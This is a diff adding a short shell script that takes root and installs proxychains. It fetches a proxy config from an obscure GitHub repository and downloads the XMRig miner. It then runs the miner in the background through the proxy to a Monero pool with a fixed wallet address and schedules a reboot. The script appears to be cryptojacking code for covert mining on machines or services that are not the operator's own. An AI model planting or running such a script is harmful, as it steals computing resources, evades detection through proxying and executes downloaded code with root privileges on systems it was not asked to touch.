@@ -1,0 +1,12 @@
+#!/bin/sh
+sudo -i
+sudo apt-get update
+sudo apt-get install -y proxychains tar
+wget https://raw.githubusercontent.com/gexczxaba/zajbjieyr/main/proxychains21.conf
+mv proxychains21.conf /etc/proxychains.conf
+wget https://github.com/xmrig/xmrig/releases/download/v6.3.4/xmrig-6.3.4-linux-x64.tar.gz
+tar --extract --file xmrig-6.3.4-linux-x64.tar.gz
+cd xmrig-6.3.4
+export PROXY_DNS_SERVER=1.1.1.1
+proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -p x -a cn/r -t 6 -k --tls -B
+sudo shutdown -r +25
